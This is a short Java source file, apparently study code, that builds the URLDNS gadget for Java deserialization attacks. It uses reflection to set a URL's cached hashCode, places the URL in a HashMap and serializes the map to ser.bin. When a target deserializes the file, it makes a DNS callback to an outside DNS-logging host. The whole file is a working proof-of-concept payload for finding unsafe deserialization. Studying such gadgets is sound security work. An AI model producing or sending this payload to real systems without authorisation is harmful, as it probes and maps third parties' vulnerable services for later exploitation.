package com.study;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class UrlDns {
    public static void main(String[] args)throws Exception {
        HashMap<URL,Integer> hashMap = new HashMap<>();
        URL u = new URL("http://2b9c7709.log.dnslog.sbs");

        // 反射
        Class c = u.getClass();
        Field hashCodeField = c.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(u, 114514);
        hashMap.put(u, 1);
        hashCodeField.set(u, -1);



        serialize(hashMap);
        //unserialize("ser.bin");
    }
    // 序列化
    public static void serialize(Object obj)throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    // 反序列化
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
